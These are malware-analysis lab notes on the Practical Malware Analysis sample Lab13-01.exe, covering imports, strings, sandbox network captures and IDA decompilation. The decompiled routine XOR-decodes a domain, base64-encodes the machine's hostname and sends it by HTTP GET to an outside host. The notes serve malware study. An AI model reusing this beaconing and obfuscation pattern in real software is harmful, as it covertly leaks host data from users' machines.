Lab13-01.exe
    PE Analysis
        # Virustotal
            35/72
            SHA-256: 71a295247ba7419f9f9dea8098e6867182bb80f53c98eb0f59192a6557a51249

            PEiD packer
                Microsoft Visual C++

            TimeStamp: 2011-11-08 23:03:23

            Subsystem: Windows CUI
            
            Sections
                Name	Virtual Address	Virtual Size	Raw Size	Entropy	MD5
                .text	4096	16374	16384	6.6	98b65b1fb2f5275f290bd313d2d25562
                .rdata	20480	2512	4096	3.82	948c0c9d6524841f03010fe20d1b73ac
                .data	24576	7784	4096	1.52	0ef703e24fbbc6b3f16dbc3ae1c0ff98
                .rsrc	32768	128	4096	0.14	863d93415743c6ec8254ff0327b9f08e

            IMPORT
            KERNEL32.dll
                GetLastError
                HeapFree
                GetStdHandle
                LCMapStringW
                SetHandleCount
                GetOEMCP
                LCMapStringA
                HeapDestroy
                ExitProcess
                GetEnvironmentStringsW
                FlushFileBuffers
                LoadLibraryA
                RtlUnwind
                GetModuleFileNameA
                FreeEnvironmentStringsA
                GetCurrentProcess
                SizeofResource
                LockResource
                GetCPInfo
                UnhandledExceptionFilter
                MultiByteToWideChar
                FreeEnvironmentStringsW
                GetCommandLineA
                GetProcAddress
                SetStdHandle
                SetFilePointer
                WideCharToMultiByte
                GetStringTypeA
                GetModuleHandleA
                WriteFile
                GetStartupInfoA
                CloseHandle
                GetACP
                HeapReAlloc
                GetStringTypeW
                TerminateProcess
                GetEnvironmentStrings
                LoadResource
                GlobalAlloc
                VirtualFree
                Sleep
                GetFileType
                HeapAlloc
                GetVersion
                FindResourceA
                VirtualAlloc
                HeapCreate
            WININET.dll
                InternetReadFile
                InternetOpenUrlA
                InternetCloseHandle
                InternetOpenA
            WS2_32.dll
                WSAStartup
                gethostname
                WSACleanup

        # strings.exe (Only part of the results)
            ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
            Sleep
            Mozilla/4.0
            http://%s/%s/
            Could not load exe.
            Could not locate dialog box.
            Could not load dialog box.
            Could not lock dialog box.
            %02x

        # Resource Hacker
            4C 4C 4C 15 4B 49 5A 58 4F 52 58 5A 57 56 5A 57 4C 5A 49 5E 5A 55 5A 57 42 48 52 48 15 58 54 56     LLLKIZXORXZWVZWLZI^ZUZWBHRHXTV

    Dynamic Analysis
        # RegShot (Part of results)
            Nothing valuable

        # procexp (View > Lower Pane View > DLLS / Handles)
            wupdmgr.exe	wupdmgr.exe		1,512 K	5,624 K	2964

        # procmon
            Nothing valuable

        # autoruns
            NULL

        # ApateDNS
            www.practicalmalwareanalysis.com
        
        # INetSim
            2020-05-02 19:28:14  HTTP connection, method: GET, URL: http://www.practicalmalwareanalysis.com/bWFsd2FyZQ==/, file name: /var/lib/inetsim/http/fakefiles/sample.html
            // http://www.practicalmalwareanalysis.com/malware/
        
        # Wireshark
            GET /bWFsd2FyZQ==/ HTTP/1.1
            User-Agent: Mozilla/4.0
            Host: www.practicalmalwareanalysis.com

        # sc
            NULL

        # WinHex > Edit > Modify Data > xor 3B
            www.practicalmalwareanalysis.com

        # PEiD KANAL               
            BASE64 table :: 000050E8 :: 004050E8
                Referenced at 00401013
                Referenced at 0040103E
                Referenced at 0040106E
                Referenced at 00401097

        # IDA Pro
            Search > text > Find all occurrences > xor
                .text:004011B8	sub_401190	                xor     eax, 3Bh
                    Ctrl+X on sub_401190            // <- extract data in .rsrc section of Lab13-01.exe
                        hResInfo = FindResourceA(hModule, 101, 0xA);// index 101; 0xA: RT_RCDATA(resource)

            G > 004050E8
                .rdata:004050E8 byte_4050E8     db 'A'                  ; DATA XREF: sub_401000+11↑r
                .rdata:004050E8                                         ; sub_401000+3C↑r ...
                .rdata:004050E9                 dd 'EDCB'
                .rdata:004050ED                 dd 'IHGF'
                .rdata:004050F1                 dd 'MLKJ'
                .rdata:004050F5                 dd 'QPON'
                .rdata:004050F9                 dd 'UTSR'
                .rdata:004050FD                 dd 'YXWV'
                .rdata:00405101                 dd 'cbaZ'
                .rdata:00405105                 dd 'gfed'
                .rdata:00405109                 dd 'kjih'
                .rdata:0040510D                 dd 'onml'
                .rdata:00405111                 dd 'srqp'
                .rdata:00405115                 dd 'wvut'
                .rdata:00405119                 db  78h ; x
                .rdata:0040511A                 db  79h ; y
                .rdata:0040511B                 db  7Ah ; z
                .rdata:0040511C byte_40511C     db '0'                  ; DATA XREF: __output+4A↑r
                .rdata:0040511D a123456789      db '123456789+/',0
                
                _BYTE *__cdecl sub_401000(unsigned __int8 *a1, _BYTE *a2, signed int a3)                // Rename base64index
                {
                _BYTE *result; // eax
                char v4; // [esp+0h] [ebp-2h]
                char v5; // [esp+1h] [ebp-1h]

                *a2 = byte_4050E8[*a1 >> 2];
                a2[1] = byte_4050E8[((a1[1] & 0xF0) >> 4) | 16 * (*a1 & 3)];
                if ( a3 <= 1 )
                    v5 = 61;
                else
                    v5 = byte_4050E8[((a1[2] & 0xC0) >> 6) | 4 * (a1[1] & 0xF)];
                a2[2] = v5;
                if ( a3 <= 2 )
                    v4 = 61;
                else
                    v4 = byte_4050E8[a1[2] & 0x3F];
                result = a2;
                a2[3] = v4;
                return result;
                }        

                Ctrl+X on sub_401000 > Base64encode (sub_4010B1)
                Ctrl+X on sub_4010B1 > sub_4011C9                   // return result (eax)
                .text:0040122A                 call    Base64encode
                ...
                .text:0040123E                 push    offset aHttpSS  ; "http://%s/%s/"
                .text:00401243                 lea     eax, [ebp+szUrl]
                .text:00401249                 push    eax             ; char *
                .text:0040124A                 call    _sprintf

                bool __cdecl sub_4011C9(int decoded_data_from_rsrc)
                {
                LOBYTE(v8) = 0;
                *(&v8 + 1) = 0;
                v9 = 0;
                v10 = 0;
                v11 = 0;
                sprintf(&szAgent, aMozilla40);                // Mozilla/4.0
                v16 = gethostname(&name, 256);
                strncpy(&v13, &name, 12u);
                v14 = 0;
                Base64encode(&v13, &v8);
                HIBYTE(v11) = 0;
                sprintf(&szUrl, aHttpSS, decoded_data_from_rsrc, &v8);// http://%s/%s/
                hInternet = InternetOpenA(&szAgent, 0, 0, 0, 0);
                hFile = InternetOpenUrlA(hInternet, &szUrl, 0, 0, 0, 0);
                if ( hFile )
                {
                    v15 = InternetReadFile(hFile, &Buffer, 0x200u, &dwNumberOfBytesRead);
                    if ( v15 )
                    {
                    result = Buffer == 111;
                    }
                    else
                    {
                    InternetCloseHandle(hInternet);
                    InternetCloseHandle(hFile);
                    result = 0;
                    }
                }
                else
                {
                    InternetCloseHandle(hInternet);
                    result = 0;
                }
                return result;
                }            

Analysis
    The malware use Base64encode to encrypt the hostname and path of target.
